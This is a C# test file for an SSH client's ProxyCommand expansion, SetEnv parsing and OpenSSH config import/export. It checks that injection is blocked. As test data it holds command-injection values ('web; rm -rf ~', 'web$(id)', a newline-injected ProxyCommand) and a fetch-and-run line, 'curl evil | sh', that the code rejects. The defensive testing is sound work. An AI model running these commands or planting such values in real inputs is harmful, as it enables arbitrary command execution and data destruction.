using Elio.Connections;
using Elio.Core;

namespace Elio.Tests;

/// <summary>ProxyCommand, SetEnv, and writing servers out as an OpenSSH config file.</summary>
public sealed class SshOptionsTests
{
    [Theory]
    [InlineData("cloudflared access ssh --hostname %h", "cloudflared access ssh --hostname web.example.com")]
    [InlineData("ssh -W %h:%p bastion", "ssh -W web.example.com:2222 bastion")]
    [InlineData("connect -u %r %n %p", "connect -u deploy web.example.com 2222")]
    [InlineData("echo 100%% %x", "echo 100% %x")]
    [InlineData("ends with %", "ends with %")]
    public void Expand_FillsInOpenSshTokens(string command, string expanded) =>
        Assert.Equal(expanded, ProxyCommand.Expand(command, "web.example.com", 2222, "deploy"));

    [Theory]
    [InlineData("web; rm -rf ~", "deploy")]
    [InlineData("web`id`", "deploy")]
    [InlineData("web$(id)", "deploy")]
    [InlineData("web example", "deploy")]
    [InlineData("web", "deploy'||id")]
    [InlineData("web", "de ploy")]
    [InlineData("web\nid", "deploy")]
    public void Expand_RefusesValuesThatWouldChangeTheCommand(string host, string user) =>
        Assert.Null(ProxyCommand.Expand("nc %h %p -u %r", host, 22, user));

    [Fact]
    public void Expand_TakesIpv6AndDomainUsers() =>
        Assert.Equal("nc 2001:db8::1 22 me@corp", ProxyCommand.Expand("nc %h %p %r", "2001:db8::1", 22, "me@corp"));

    [Fact]
    public void ApprovalName_IsTheSameForTheSameCommand_AndDiffersOtherwise()
    {
        Assert.Equal(ProxyCommand.ApprovalName("nc %h %p"), ProxyCommand.ApprovalName("nc %h %p"));
        Assert.NotEqual(ProxyCommand.ApprovalName("nc %h %p"), ProxyCommand.ApprovalName("nc %h  %p"));
    }

    [Fact]
    public async Task StartAsync_WithoutApproval_RunsNothing()
    {
        Func<string, CancellationToken, Task<bool>> before = ProxyCommand.Approve;
        string? asked = null;
        ProxyCommand.Approve = (command, _) =>
        {
            asked = command;
            return Task.FromResult(false);
        };
        try
        {
            await Assert.ThrowsAsync<ProxyFailedException>(() => ProxyCommand.StartAsync("nc %h %p", "web", 22, "deploy", CancellationToken.None));
            Assert.Equal("nc %h %p", asked);
        }
        finally
        {
            ProxyCommand.Approve = before;
        }
    }

    [Fact]
    public void StartInfo_GoesThroughTheShell_WithTheCommandAsOneArgument()
    {
        var start = ProxyCommand.StartInfo("nc web 22 | tee log");

        Assert.Equal("nc web 22 | tee log", start.ArgumentList[^1]);
        Assert.True(start.RedirectStandardInput && start.RedirectStandardOutput && start.RedirectStandardError);
        Assert.False(start.UseShellExecute);
    }

    [Fact]
    public void Resolver_TakesACommandProxy_ForAProxy()
    {
        var host = new HostEntry { Name = "web", Kind = HostKind.Ssh, Address = "web", Proxy = new ProxySettings { Kind = ProxyKind.Command, Command = "nc %h %p" } };
        var library = new HostLibrary { Hosts = [host] };

        ResolvedHost resolved = ConnectionResolver.Resolve(host, library);

        Assert.Equal(ProxyKind.Command, resolved.Proxy?.Kind);
        SshProxy? proxy = SshEndpoints.ProxyFor([resolved], _ => null);
        Assert.Equal(ProxyKind.Command, proxy?.Kind);
        Assert.Equal("nc %h %p", proxy?.Command);
    }

    [Fact]
    public void Resolver_AnEmptyCommand_IsADirectConnection()
    {
        var host = new HostEntry { Name = "web", Kind = HostKind.Ssh, Address = "web", Proxy = new ProxySettings { Kind = ProxyKind.Command, Command = " " } };

        Assert.Null(ConnectionResolver.Resolve(host, new HostLibrary { Hosts = [host] }).Proxy);
    }

    [Fact]
    public void AFileFromSomeoneElse_WithAProxyCommand_IsAskedAbout_AndMadePlain()
    {
        var host = new HostEntry { Name = "web", Kind = HostKind.Ssh, Address = "web", Proxy = new ProxySettings { Kind = ProxyKind.Command, Command = "curl evil | sh" } };
        var library = new HostLibrary { Hosts = [host] };

        Assert.True(LibraryFile.ActsOnItsOwn(host));
        LibraryFile.MakePlain(library);
        Assert.Null(host.Proxy);
    }

    [Fact]
    public void OpenSshImport_ReadsProxyCommandAndSetEnv()
    {
        const string config = """
            Host edge
                HostName edge.internal
                User deploy
                ProxyCommand cloudflared access ssh --hostname %h
                SetEnv LANG=en_US.UTF-8 GREETING="hello there"

            Host inner
                HostName 10.0.0.9
                ProxyJump edge
                ProxyCommand nc %h %p
            """;

        List<HostEntry> hosts = HostImport.FromSshConfig(config, _ => []);
        HostEntry edge = hosts.Single(h => h.Name == "edge");
        HostEntry inner = hosts.Single(h => h.Name == "inner");

        Assert.Equal(ProxyKind.Command, edge.Proxy?.Kind);
        Assert.Equal("cloudflared access ssh --hostname %h", edge.Proxy?.Command);
        Assert.Equal("en_US.UTF-8", edge.Environment["LANG"]);
        Assert.Equal("hello there", edge.Environment["GREETING"]);

        // A jump host is how inner is reached; its ProxyCommand is not used as well.
        Assert.Null(inner.Proxy);
        Assert.Single(inner.JumpHosts);
    }

    [Theory]
    [InlineData("A=1 B=2", "A", "1")]
    [InlineData("  A=1   B=\"two words\"  ", "B", "two words")]
    [InlineData("EMPTY= A=1", "EMPTY", "")]
    public void ParseSetEnv(string text, string name, string value) =>
        Assert.Equal(value, HostImport.ParseSetEnv(text)[name]);

    [Fact]
    public void ParseSetEnv_SkipsWordsWithoutAName() =>
        Assert.Equal(["A"], HostImport.ParseSetEnv("=x junk A=1").Keys);

    private static HostLibrary ExampleLibrary(out HostEntry web, out HostEntry bastion)
    {
        var group = new HostGroup { Name = "Production", User = "deploy", Port = 2222 };
        bastion = new HostEntry { Name = "Bastion", Kind = HostKind.Ssh, Address = "bastion.example.com", Port = 0 };
        web = new HostEntry
        {
            Name = "Web server 1",
            Kind = HostKind.Ssh,
            Address = "10.0.0.5",
            Port = 0,
            GroupId = group.Id,
            KeyPath = @"C:\Users\Jane Doe\.ssh\id_ed25519",
            JumpHosts = [bastion.Id],
            ForwardAgent = true,
            Forwards = [new PortForward { Kind = ForwardKind.Local, BindAddress = "127.0.0.1", BindPort = 8080, TargetHost = "localhost", TargetPort = 80 }],
            Environment = new() { ["LANG"] = "C.UTF-8" },
        };
        return new HostLibrary { Hosts = [web, bastion], Groups = [group] };
    }

    [Fact]
    public void Export_WritesAHostBlockPerServer_WithGroupDefaultsResolved()
    {
        string config = SshConfigExport.Write(ExampleLibrary(out _, out _));

        Assert.Contains("Host Web-server-1\n", config);
        Assert.Contains("# Web server 1\n", config);
        Assert.Contains("    HostName 10.0.0.5\n", config);
        Assert.Contains("    User deploy\n", config);
        Assert.Contains("    Port 2222\n", config);
        Assert.Contains("    IdentityFile \"C:\\Users\\Jane Doe\\.ssh\\id_ed25519\"\n", config);
        Assert.Contains("    ProxyJump Bastion\n", config);
        Assert.Contains("    ForwardAgent yes\n", config);
        Assert.Contains("    LocalForward 127.0.0.1:8080 localhost:80\n", config);
        Assert.Contains("    SetEnv LANG=C.UTF-8\n", config);
        Assert.Contains("Host Bastion\n", config);
    }

    [Fact]
    public void Export_ReadsBackThroughTheImport()
    {
        string config = SshConfigExport.Write(ExampleLibrary(out _, out _));

        List<HostEntry> imported = HostImport.FromSshConfig(config, _ => []);
        HostEntry web = imported.Single(h => h.Name == "Web-server-1");

        Assert.Equal("10.0.0.5", web.Address);
        Assert.Equal(2222, web.Port);
        Assert.Equal("deploy", web.User);
        Assert.Equal(@"C:\Users\Jane Doe\.ssh\id_ed25519", web.KeyPath);
        Assert.True(web.ForwardAgent);
        Assert.Equal("C.UTF-8", web.Environment["LANG"]);
        Assert.Equal(imported.Single(h => h.Name == "Bastion").Id, Assert.Single(web.JumpHosts));
    }

    [Fact]
    public void Export_NeverWritesWhatTheVaultKeeps()
    {
        HostLibrary library = ExampleLibrary(out HostEntry web, out _);
        var identity = new Identity { Name = "ops key", Kind = IdentityKind.Key, User = "ops" };
        library.Identities.Add(identity);
        web.KeyPath = null;
        web.IdentityId = identity.Id;

        string config = SshConfigExport.Write(library);

        Assert.Contains("# Logs in with the key of the identity \"ops key\"", config);
        Assert.DoesNotContain("PRIVATE KEY", config);
        Assert.Contains("    User ops\n", config);
    }

    [Fact]
    public void Export_LeavesOutWhatSshCannotOpen()
    {
        var library = new HostLibrary
        {
            Hosts =
            [
                new HostEntry { Name = "switch", Kind = HostKind.Telnet, Address = "10.0.0.1" },
                new HostEntry { Name = "PowerShell", Kind = HostKind.Local, Address = "pwsh.exe" },
                new HostEntry { Name = "nas", Kind = HostKind.Ssh, Address = "nas.local" },
            ],
        };

        string config = SshConfigExport.Write(library);

        Assert.Contains("Host nas\n", config);
        Assert.DoesNotContain("switch", config);
        Assert.DoesNotContain("PowerShell", config);
    }

    [Fact]
    public void Export_NamesThatComeOutTheSame_AreMadeUnique()
    {
        var a = new HostEntry { Name = "web 1", Kind = HostKind.Ssh, Address = "a" };
        var b = new HostEntry { Name = "web/1", Kind = HostKind.Ssh, Address = "b" };

        Dictionary<Guid, string> aliases = SshConfigExport.Aliases([a, b]);

        Assert.Equal("web-1", aliases[a.Id]);
        Assert.Equal("web-1-2", aliases[b.Id]);
    }

    [Fact]
    public void Export_ALineBreakInAValue_CannotAddASetting()
    {
        var host = new HostEntry { Name = "web", Kind = HostKind.Ssh, Address = "web", User = "deploy\nProxyCommand evil" };

        string config = SshConfigExport.Write(new HostLibrary { Hosts = [host] });

        Assert.DoesNotContain("\nProxyCommand", config);
        Assert.DoesNotContain("\n    ProxyCommand", config);
    }

    [Fact]
    public void Export_WritesAProxyCommand_AsIt_Is()
    {
        var host = new HostEntry { Name = "edge", Kind = HostKind.Ssh, Address = "edge", Proxy = new ProxySettings { Kind = ProxyKind.Command, Command = "cloudflared access ssh --hostname %h" } };

        Assert.Contains("    ProxyCommand cloudflared access ssh --hostname %h\n", SshConfigExport.Write(new HostLibrary { Hosts = [host] }));
    }
}
